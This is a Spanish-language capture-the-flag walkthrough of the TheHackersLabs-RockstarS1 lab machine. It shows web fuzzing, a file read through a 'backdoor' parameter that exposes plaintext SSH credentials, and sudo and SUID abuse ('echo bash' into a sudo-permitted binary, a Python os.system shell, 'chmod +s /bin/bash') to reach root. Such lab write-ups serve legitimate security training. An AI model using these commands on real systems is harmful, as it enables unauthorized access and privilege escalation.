
# Reporte de CTF: TheHackersLabs-RockstarS1

## Fase de Reconocimiento y Escaneo

### Escaneo de Puertos y Servicios

Se inicia el descubrimiento del objetivo ejecutando la herramienta de reconocimiento para identificar los puertos abiertos y sus versiones correspondientes.

```bash
# Comando de reconocimiento inicial
recon
```

**Resultado del escaneo:**

- **Puerto 22/tcp** (Open): SSH - OpenSSH 9.2p1 Debian 2+deb12u3 (Protocolo 2.0)
- **Puerto 80/tcp** (Open): HTTP - Apache httpd 2.4.62 (Debian). No posee título web indexado.

### Fuzzing Web (Fuzzing de Archivos)

Se realiza un descubrimiento de archivos y recursos ocultos en el servidor web utilizando la herramienta `ffuf`.

```bash
ffuf -u http://192.168.1 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt
```

**Resultados obtenidos:**

- `/index.html` (Status: 200 | Size: 0)
- `/db.php` (Status: 200 | Size: 0)
- `/index.php` (Status: 500 | Size: 19) - Indica un posible error en el código del servidor al procesar la solicitud.
- `/wp-forum.phps` (Status: 403 | Size: 278)

### Fuzzing de Parámetros Web

Al detectar que `/index.php` responde con un código de estado 500, se sospecha de una vulnerabilidad de Inclusión de Archivos Locales (LFI) o inyección de parámetros. Se utiliza `wfuzz` para auditar el parámetro correcto apuntando al archivo `/etc/passwd`.

```bash
wfuzz -w /usr/share/wordlists/dirb/common.txt -u "http://192.168.1" -d "FUZZ=/etc/passwd" --hc 404 --hh 19
```

> **Nota:** La ejecución exitosa de este ataque o el análisis posterior del comportamiento web reveló la existencia del parámetro `backdoor`.
<img width="1920" height="926" alt="index php" src="https://github.com/user-attachments/assets/e1fe7e79-8305-44ff-9db6-cadbfe2f4809" />

---

## 2. Fase de Explotación y Acceso Inicial

### Inyección de Código / Lectura de Archivos

Se interactúa con la vulnerabilidad encontrada en el parámetro `backdoor` del archivo `index.php` para leer el contenido del archivo de base de datos interno (`db.php`).

```bash
curl -XPOST http://192.168.1 -d "backdoor=/var/www/html/db.php"
```

**Respuesta obtenida del servidor:**

```php
Yo no soy tu marido
<?php  
$usuario = "shark";  
$contrasena = "djbasdnbasdas&$AAAALLthl";    
?>
```

### Intrusión mediante SSH

Utilizando las credenciales expuestas en el código fuente de `db.php`, se realiza una conexión SSH hacia la máquina objetivo.

```bash
ssh shark@192.168.1.145
```

Se logra el acceso exitoso al sistema como el usuario `shark`.

---

## 3. Escalada de Privilegios (Lateral y Vertical)

### Paso 1: De `shark` a `wvverez`

Dentro del sistema, se listan los privilegios de sudo disponibles para el usuario actual.

```bash
sudo -l
```

**Resultado:**

```
User shark may run the following commands on TheHackersLabs-RockstarS:
   (wvverez) NOPASSWD: /home/shark/bof
```

Se observa que se puede ejecutar un binario o script llamado `bof` ubicado en el propio directorio de `shark` con los privilegios del usuario `wvverez`. Para abusar de este comportamiento, se reemplaza el contenido del archivo para invocar una consola.

```bash
echo "bash" > /home/shark/bof
sudo -u wvverez /home/shark/bof
```

El contexto cambia y se obtiene una sesión de comandos como `wvverez`.

### Paso 2: De `wvverez` a `username3`

Al revisar el entorno de `wvverez`, se identifica la capacidad de ejecutar un script de Python de manera privilegiada. Se genera un script para forzar el despliegue de una nueva shell interactiva.

```bash
# Creación del script malicioso
import os
os.system("bash")
```

Se ejecuta el script utilizando la configuración de sudo permitida:

```bash
sudo -u username3 /usr/bin/python3 /home/loseey/rubiales.py
```

El contexto cambia y ahora se opera bajo los privilegios de `username3`.

### Paso 3: De `username3` a `root` (Máximos Privilegios)

Se vuelven a auditar los permisos de sudo de la cuenta actual para buscar el vector final de elevación.

```bash
sudo -l
```

**Resultado:**

```
(root) NOPASSWD: /usr/bin/bsh
```

El usuario puede ejecutar la shell interactiva `/usr/bin/bsh` como root. Se accede a la herramienta y se abusa de su función interna para alterar los permisos de la shell estándar del sistema (`/bin/bash`), otorgándole el bit SUID.

```bash
# Dentro de la consola bsh
exec("id");
exec("chmod +s /bin/bash");
```

Finalmente, se sale del intérprete `bsh` y se ejecuta la shell aprovechando el privilegio SUID configurado anteriormente.

```bash
bash -p
```

> **¡Privilegios de ROOT alcanzados con éxito!**
```
